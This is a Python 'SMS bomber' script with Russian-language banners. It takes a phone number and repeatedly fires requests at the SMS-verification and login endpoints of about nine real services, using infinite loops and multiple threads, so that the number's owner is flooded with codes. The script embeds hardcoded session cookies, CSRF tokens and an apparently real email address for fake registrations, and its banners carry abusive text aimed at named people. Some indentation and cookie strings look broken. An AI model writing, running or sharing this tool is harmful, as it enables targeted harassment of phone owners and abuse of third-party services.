from termcolor import colored
import requests
from threading import Thread
currT = 1
print(colored('''
╔╗╔╗╔══╗
║╔╗║║║║║
║╚╝╚╣╚╝║
║╔═╗╠═╗║
║╚═╝║╔╝║
╚═══╝╚═╝
НЕ ХОЧУ МУЧАТЬСЯ ИСКАТЬ ГЕНЕРАТОР''','red'))
print(colored('''
 Для оставки скрипта на андроид - Vol(-)+Z
 ''','cyan'))
print(colored('''
SPECIAL FOR MAYSKIY DOLBAEB
''','red'))
print(colored('''
ТУПО НАЕБАЛ ПОДПИСЧИКАВ МАТЕО
''','blue'))
print(colored('''
ТАК НЕ ДЕЛАЕТСЯ, ДРУГ
''','yellow'))
print(colored('''
С ВАМИ БЫЛ МАЙКУХА ГОЛДИ, СОФТ НА ГИТХАБЕ ССЫЛКУ В ЛС СКИНУ
''','pink'))

phone = input('Phone Number (Format +7999999999 / +380999999999')

if phone[0:3] == '+79':
  countT = int(input('Потоков: '))
def infinity():
 while True:
  if phone[0:3]=='+79':
    cl = requests.session()
    cl.get('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp')
    rMV = requests.post('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp', data = {'phone':phone[2:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'__SourceTracker=google__organic;_dc_gtm_UA-1873769-1=1;_fbp=1548089553260;_ga=1118344361;_gat_owox37=1;_gcl_au=397168788;_gid=289341971;_ym_d=1547846842;_ym_isad=2;_ym_uid=1547846842874071677;_ym_visorc_25907066=w;_ym_visorc_338158=b;BIGipServeratg-ps-prod_tcp80='+cl.cookies['BIGipServeratg-ps-prod_tcp80']+';bIPs='+cl.cookies['bIPs']+';CACHE_INDICATOR='+cl.cookies['CACHE_INDICATOR']+';COMPARISON_INDICATOR='+cl.cookies['COMPARISON_INDICATOR']+';cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=c4fb55af-e800-4aa6-a020-7797a2510be0;deviceType=desktop;flacktory='+cl.cookies['flacktory']+';Flocktory_Global_ID=4a848e72-a240-47d3-aaeffa8ae67bdd2b;flocktory-uuid=b8cd369d-ffc6-45cc-9fe9-0e51948ef7c9-8;JSESSIONID'+cl.cookies['JSESSIONID']+';MVID_CITY_ID='+cl.cookies['MVID_CITY_ID']+';MVID_GUEST_ID='+cl.cookies['MVID_GUEST_ID']+';MVID_VIEWED_PRODUCTS='''+';tmr_detect=0|1548089556738;TS0102af22='+cl.cookies['TS0102af22']+';TS0102af22_77=08e3680a10ab28000e39f4bb39e0cf339a7e5f1189c45465b0c27e2b7ed92d9de1494f0bb365d7d804e5e784f65b7d7e083af2c9c08238003acc11662a964627e64bb241d9f9b7f874bc8b75d4b16fb4d42278a017963461daec9960021cce1f17628d24438a180081db36f48e1a81db;TS01189d65='+cl.cookies['TS01189d65']+';TS01ce11b2=01ed0a41c8db23e98adbf724600dcaa4a69363eb702e5e5714b57c1c5145d67beb858c9a248fd9a16d3ff119482bc952c7e3b8812c;uxs_uid=ea77bc50-1d9c-11e9-9009-53c0a7c4cdb3;wurfl_device_id=generic_web_browser;','Host':'www.mvideo.ru','Referer':'https://www.mvideo.ru/register?sn=false','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
    if rMV.status_code == 200:
 	  	print(colored('Сообщение от сервиса №1 отправлено!','green'))
    else:
      print(colored('Сообщение от сервиса №1 не отправлено!','red'))
    rSL = requests.post('https://api.sunlight.net/v3/customers/authorization/', data = {'phone':phone[1:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'_fbp=1548089029383;_ga=GA1.2.1643496723.1548089014;_gat_owox=1;_gat_test=1;_gcl_au=1.1.541266814.1548089013;_gid=GA1.2.339032438.1548089014;_ym_d=1548089016;_ym_isad=2;_ym_uid=1548089016524397773;_ym_visorc_5901091=w;c_medium=referral;c_source=www.google.com;cto_lwid;region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad;region_subdomain=','Host':'api.sunlight.net','Origin':'https://sunlight.net','Referer':'https://sunlight.net/profile/login/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
    if rSL.status_code == 200:
      print(colored('Сообщение от сервиса №2 отправлено!','green'))
    else:
      print(colored('Сообщение от сервиса №2 не отправлено!','red'))
    rFN = requests.post('https://api.fex.net/api/v1/auth/scaffold', data = {'phone':phone[1:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'kepp-alive','Cookie':'_ga=GA1.2.1166716131.1550503357;_gid=GA1.2.807690535.1550503357;alt-register-code=406701;cid=6659361518671092072;G_ENABLED_IDPS=goole;','Host':'api.fex.net','Origin':'https://fex.net','Referer':'https://fex.net/login','TE':'Trailers','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
    if rFN.status_code == 200:
      print(colored('Сообщение от сервиса №3 отправлено!','green'))
    else:
 	  	print(colored('Сообщение от сервиса №3 не отправлено!','red'))
    rVI = requests.post('https://api-production.viasat.ru/api/v1/auth_codes', data = {'msisdn':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'ru','Connection':'keep-alive','Host':'api-production.viasat.ru','Origin':'https://vipplay.ru','Referer':'https://vipplay.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})	
    if rVI.status_code == 204:
 	  	print(colored('Сообщение от сервиса №4 отправлено!','green'))
    else:
 	  	print(colored('Сообщение от сервиса №4 не отправлено!','red'))
    clDC = requests.session()
    clDC.get('https://www.delivery-club.ru/')
    rDC = requests.post('https://www.delivery-club.ru/ajax/user_otp', data = {'phone':phone[1:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'__sonar=9096940928659092945;__zlcmid=qvi1moOuMZLrn2;_dc_gtm_UA-9598444-2=1;_delivery_menu_fullsize_photo_experiment=1;_delivery_visitor_cookie='+clDC.cookies['_delivery_visitor_cookie']+';_fbp=fb.1.1550525573507.680207634;=_ga=GA1.2.2064764937.1550525569;_gat_UA-9598444-2=1;_gid=GA1.2.609143235.1550525569;advcake_session=1;cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=ca775657-38ee-4429-bdcd-ec1cbcbf526c;dcse=0;FD_ab_group='+clDC.cookies['FD_ab_group']+';flocktory-uuid=a375726b-df59-42a8-9e34-027e98edabdc-6;gdeslon.ru.user_id=1c93ee6e-3a34-46e4-a334-caa05d8d8a24;mr1lad=5c6b24b05b4e8a9d-300-300-;PHPSESSID='+clDC.cookies['PHPSESSID']+';smartbanner-full-shown=true;tmr_detect=0|1550525571650;user_unic_ac_id=af6bbe6e-e6fa-e625-a93f-a7d82c3a9661;visitor_identifier='+clDC.cookies['visitor_identifier']+';','Host':'www.delivery-club.ru','Referer':'https://www.delivery-club.ru/','TE':'Trailers','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRF-Token':'xGO8d6jEwUVpY2GZKeNxUsTRFN5SQj1htcXpxePlc08'})
    if rDC.status_code == 200:
      print(colored('Сообщение от cервиса №5 отправлено!','green'))
    else:
 	  	print(colored('Сообщение от сервиса №5 не отправлено!','red'))
    clGT = requests.session()
    clGT.get('https://driver.gett.ru/signup/')
    rGT = requests.post('https://driver.gett.ru/api/login/phone/', data = {'phone':phone,'registration':'true'}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'csrftoken='+clGT.cookies['csrftoken']+'; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2','Host':'driver.gett.ru','Referer':'https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRFToken':clGT.cookies['csrftoken']})
    if rGT.status_code == 200:
   	  print(colored('Сообщение от сервиса №6 отправлено!','green'))
    else:
 	    print(colored('Сообщение от сервиса №6 не отправлено!','red'))
    clDV = requests.session()
    clDV.get('https://drugvokrug.ru/siteActions/processSms.htm')
    rDV = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone[1:]}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+clDV.cookies['JSESSIONID']+';','Host':'drugvokrug.ru','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
    if(rDV.status_code == 200):
	     print(colored('Сообщение от сервиса №8 отправлено!','green'))
    else:
	     print(colored('Сообщение от сервиса №8 не отправлено','red'))
    rUT = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Host':'b.utair.ru','origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
    if(rUT.status_code == 200):
	     print(colored('Сообщение от сервиса №9 отправлено!','green'))
    else:
	     print(colored('Сообщение от сервиса №9 не отправлено','red'))
    rGRAB = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone[1:], 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
    if(rGRAB.status_code == 200):
	    print(colored('Сообщение от сервиса №10 отправлено!','green'))
    else:
	    print(colored('Сообщение от сервиса №10 не отправлено','red'))
  if phone[0:3] == '+38':
    clDV = requests.session()
    clDV.get('https://drugvokrug.ru/siteActions/processSms.htm')
    rDV = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+clDV.cookies['JSESSIONID']+';','Host':'drugvokrug.ru','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
    if(rDV.status_code == 200):
      print(colored('Сообщение от сервиса №1 отправлено!','green'))
    else:
      print(colored('Сообщение от сервиса №1 не отправлено','red'))
    rVI = requests.post('https://api-production.viasat.ru/api/v1/auth_codes', data = {'msisdn':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'ru','Connection':'keep-alive','Host':'api-production.viasat.ru','Origin':'https://vipplay.ru','Referer':'https://vipplay.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'}) 
    if(rVI.status_code == 204):
      print(colored('Сообщение от сервиса №2 отправлено!','green'))
    else:
      print(colored('Сообщение от сервиса №2 не отправлено','red'))
    rUT = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Host':'b.utair.ru','origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
    if(rUT.status_code == 200):
      print(colored('Сообщение от сервиса №4 отправлено!','green'))
    else:
      print(colored('Сообщение от сервиса №4 не отправлено','red'))
    rGRAB = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone[1:], 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
    if(rGRAB.status_code == 200):
      print(colored('Сообщение от сервиса №5 отправлено!','green'))
    else:
      print(colored('Сообщение от сервиса №5 не отправлено','red'))
a = True
def mv():
	while True:
		cl = requests.session()
		cl.get('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp')
		newcook = '__SourceTracker=google__organic;_dc_gtm_UA-1873769-1=1;_fbp=1548089553260;_ga=1118344361;_gat_owox37=1;_gcl_au=397168788;_gid=289341971;_ym_d=1547846842;_ym_isad=2;_ym_uid=1547846842874071677;_ym_visorc_25907066=w;_ym_visorc_338158=b;BIGipServeratg-ps-prod_tcp80='+cl.cookies['BIGipServeratg-ps-prod_tcp80']+';bIPs='+cl.cookies['bIPs']+';CACHE_INDICATOR='+cl.cookies['CACHE_INDICATOR']+';COMPARISON_INDICATOR='+cl.cookies['COMPARISON_INDICATOR']+';cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=c4fb55af-e800-4aa6-a020-7797a2510be0;deviceType=desktop;flacktory='+cl.cookies['flacktory']+';Flocktory_Global_ID=4a848e72-a240-47d3-aaeffa8ae67bdd2b;flocktory-uuid=b8cd369d-ffc6-45cc-9fe9-0e51948ef7c9-8;JSESSIONID'+cl.cookies['JSESSIONID']+';MVID_CITY_ID='+cl.cookies['MVID_CITY_ID']+';MVID_GUEST_ID='+cl.cookies['MVID_GUEST_ID']+';MVID_VIEWED_PRODUCTS='''+';tmr_detect=0|1548089556738;TS0102af22='+cl.cookies['TS0102af22']+';TS0102af22_77=08e3680a10ab28000e39f4bb39e0cf339a7e5f1189c45465b0c27e2b7ed92d9de1494f0bb365d7d804e5e784f65b7d7e083af2c9c08238003acc11662a964627e64bb241d9f9b7f874bc8b75d4b16fb4d42278a017963461daec9960021cce1f17628d24438a180081db36f48e1a81db;TS01189d65='+cl.cookies['TS01189d65']+';TS01ce11b2=01ed0a41c8db23e98adbf724600dcaa4a69363eb702e5e5714b57c1c5145d67beb858c9a248fd9a16d3ff119482bc952c7e3b8812c;uxs_uid=ea77bc50-1d9c-11e9-9009-53c0a7c4cdb3;wurfl_device_id=generic_web_browser;'
		rMV = requests.post('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp', data = {'phone':phone[2:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':newcook,'Host':'www.mvideo.ru','Referer':'https://www.mvideo.ru/register?sn=false','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
		if rMV.status_code == 200:
 			 print('Сообщение от сервиса №1 отправлено!')
		else:
    			print('Сообщение от сервиса №1 не отправлено!')
tM = Thread(target=infinity)
tM.start()
if phone[0:3] == '+79':
  while currT<=countT:
	  t = Thread(target=mv)
	  t.start()
	  currT+=1
